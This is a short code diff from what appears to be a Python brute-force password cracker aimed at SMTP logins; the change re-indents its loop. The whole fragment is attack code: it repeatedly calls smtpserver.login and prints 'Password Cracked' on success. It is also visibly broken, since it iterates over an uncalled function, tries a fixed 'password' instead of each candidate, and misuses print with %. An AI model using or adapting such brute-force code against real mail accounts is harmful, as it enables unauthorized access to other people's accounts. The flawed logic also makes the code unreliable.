@@ -16,16 +16,16 @@ def print_perms(chars, minlen, maxlen):
 
 
 
-for symbols in print_perms:
+            for symbols in print_perms:
 
 
-       try:
-           smtpserver.login(user, password)
+               try:
+                   smtpserver.login(user, password)
 
-           print("[+] Password Cracked: %s") % symbols
-           break
-       except smtplib.SMTPAuthenticationError:
-           print("[!] Password Inccorect: %s") % symbols
+                   print("[+] Password Cracked: %s") % symbols
+                   break
+               except smtplib.SMTPAuthenticationError:
+                   print("[!] Password Inccorect: %s") % symbols
 
 
 
